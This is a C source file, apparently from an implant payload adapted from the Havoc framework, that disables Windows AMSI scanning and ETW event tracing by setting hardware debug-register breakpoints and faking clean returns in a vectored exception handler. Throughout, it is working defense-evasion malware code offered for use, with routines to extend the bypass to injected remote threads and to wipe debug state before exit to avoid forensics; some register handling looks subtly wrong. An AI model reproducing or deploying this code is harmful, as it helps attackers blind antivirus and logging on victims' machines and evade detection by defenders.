/**
 * hwbp_bypass.c — Hardware breakpoint AMSI/ETW bypass via VEH
 *
 * Borrowed and adapted from HavocFramework/Havoc (MIT licence)
 * Source: payloads/Demon/src/core/HwBpEngine.c + HwBpExceptions.c
 *
 * Technique:
 *   Instead of patching AmsiScanBuffer/EtwEventWrite bytes directly
 *   (detectable by integrity checks), this places an x86 hardware debug
 *   register (Dr0–Dr3) on the function entry point.
 *   A Vectored Exception Handler catches the resulting single-step exception
 *   and modifies the thread context to fake a clean return:
 *     - AMSI: sets rax=0 (AMSI_RESULT_CLEAN), advances RIP past the prologue
 *     - ETW:  sets rax=0 (STATUS_SUCCESS), returns immediately
 *
 *   Hardware breakpoints leave no byte-level IOC in the target function.
 *   Memory scanners and integrity verifiers see the original function bytes.
 *
 * MITRE: T1562.001 (Impair Defenses: Disable or Modify Tools)
 *        T1055 (Process Injection — uses debug registers)
 */

#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdbool.h>

/* Forward declarations from indirect_syscall.c */
extern NTSTATUS ISysNtGetContextThread(HANDLE,PCONTEXT);
extern NTSTATUS ISysNtSetContextThread(HANDLE,PCONTEXT);

/* ── Target function addresses ───────────────────────────────────────────── */

typedef struct {
    PVOID AmsiScanBuffer;
    PVOID EtwEventWrite;
    PVOID NtTraceEvent;
    PVOID VehHandle;
    bool  Active;
} HWBP_STATE;

static HWBP_STATE g_Hwbp = { 0 };

/* ── Debug register helpers ──────────────────────────────────────────────── */

static BOOL _set_hwbp(HANDLE hThread, PVOID addr, int slot, bool add)
{
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!NT_SUCCESS(ISysNtGetContextThread(hThread, &ctx)))
        return FALSE;

    if (add) {
        (&ctx.Dr0)[slot] = (ULONG_PTR)addr;
        ctx.Dr7 &= ~(3ULL << (16 + 4 * slot));  /* condition: execute (00) */
        ctx.Dr7 &= ~(3ULL << (18 + 4 * slot));  /* length: 1-byte (00) */
        ctx.Dr7 |=  (1ULL << (2 * slot));        /* enable local breakpoint */
    } else {
        (&ctx.Dr0)[slot] = 0;
        ctx.Dr7 &= ~(1ULL << (2 * slot));
    }

    return NT_SUCCESS(ISysNtSetContextThread(hThread, &ctx));
}

/* ── VEH handler ─────────────────────────────────────────────────────────── */

static LONG NTAPI _hwbp_veh(PEXCEPTION_POINTERS ep)
{
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    PVOID rip = (PVOID)ep->ContextRecord->Rip;

    /* AMSI — AmsiScanBuffer: make it return AMSI_RESULT_CLEAN (0) */
    if (rip == g_Hwbp.AmsiScanBuffer) {
        ep->ContextRecord->Rax = 0;                   /* S_OK */
        /* Write AMSI_RESULT_CLEAN to the out-param (7th arg on stack) */
        ULONG *result_ptr = *(ULONG **)(ep->ContextRecord->Rsp + 0x38);
        if (result_ptr) *result_ptr = 0; /* AMSI_RESULT_CLEAN */
        ep->ContextRecord->Rip += 3;     /* skip past function prologue */
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    /* ETW — EtwEventWrite: return STATUS_SUCCESS (0) immediately */
    if (rip == g_Hwbp.EtwEventWrite) {
        ep->ContextRecord->Rax = 0;
        ep->ContextRecord->Rip = ep->ContextRecord->Rsp; /* return address */
        ep->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    /* NtTraceEvent: same treatment */
    if (rip == g_Hwbp.NtTraceEvent) {
        ep->ContextRecord->Rax = 0;
        ep->ContextRecord->Rip = ep->ContextRecord->Rsp;
        ep->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

/* ── Module resolution (no GetProcAddress hooked check) ─────────────────── */

static PVOID _get_export(const wchar_t *dll, const char *func)
{
    HMODULE h = GetModuleHandleW(dll);
    if (!h) h = LoadLibraryW(dll);
    if (!h) return NULL;
    return GetProcAddress(h, func);
}

/* ── Public API ──────────────────────────────────────────────────────────── */

/**
 * HwBpBypassInit — install hardware breakpoints on AMSI/ETW entry points.
 * Call once at implant startup. Returns TRUE if all hooks placed.
 */
BOOL HwBpBypassInit(void)
{
    if (g_Hwbp.Active) return TRUE;

    g_Hwbp.AmsiScanBuffer = _get_export(L"amsi.dll",   "AmsiScanBuffer");
    g_Hwbp.EtwEventWrite  = _get_export(L"ntdll.dll",  "EtwEventWrite");
    g_Hwbp.NtTraceEvent   = _get_export(L"ntdll.dll",  "NtTraceEvent");

    /* Register VEH — highest priority (first param = TRUE) */
    g_Hwbp.VehHandle = AddVectoredExceptionHandler(TRUE, _hwbp_veh);
    if (!g_Hwbp.VehHandle) return FALSE;

    HANDLE hSelf = GetCurrentThread();
    bool ok = true;

    if (g_Hwbp.AmsiScanBuffer)
        ok &= _set_hwbp(hSelf, g_Hwbp.AmsiScanBuffer, 0, true);
    if (g_Hwbp.EtwEventWrite)
        ok &= _set_hwbp(hSelf, g_Hwbp.EtwEventWrite,  1, true);
    if (g_Hwbp.NtTraceEvent)
        ok &= _set_hwbp(hSelf, g_Hwbp.NtTraceEvent,   2, true);

    g_Hwbp.Active = ok;
    return ok;
}

/**
 * HwBpBypassInstallOnThread — apply the same breakpoints to another thread.
 * Call this when injecting into a remote thread so that thread's AMSI is
 * also bypassed.
 */
BOOL HwBpBypassInstallOnThread(HANDLE hThread)
{
    if (!g_Hwbp.Active) return FALSE;
    bool ok = true;
    if (g_Hwbp.AmsiScanBuffer)
        ok &= _set_hwbp(hThread, g_Hwbp.AmsiScanBuffer, 0, true);
    if (g_Hwbp.EtwEventWrite)
        ok &= _set_hwbp(hThread, g_Hwbp.EtwEventWrite,  1, true);
    if (g_Hwbp.NtTraceEvent)
        ok &= _set_hwbp(hThread, g_Hwbp.NtTraceEvent,   2, true);
    return ok;
}

/**
 * HwBpBypassRemove — uninstall all hardware breakpoints.
 * Call before clean exit to avoid leaving debug state visible to forensics.
 */
VOID HwBpBypassRemove(void)
{
    HANDLE hSelf = GetCurrentThread();
    _set_hwbp(hSelf, NULL, 0, false);
    _set_hwbp(hSelf, NULL, 1, false);
    _set_hwbp(hSelf, NULL, 2, false);
    if (g_Hwbp.VehHandle)
        RemoveVectoredExceptionHandler(g_Hwbp.VehHandle);
    g_Hwbp.Active    = false;
    g_Hwbp.VehHandle = NULL;
}
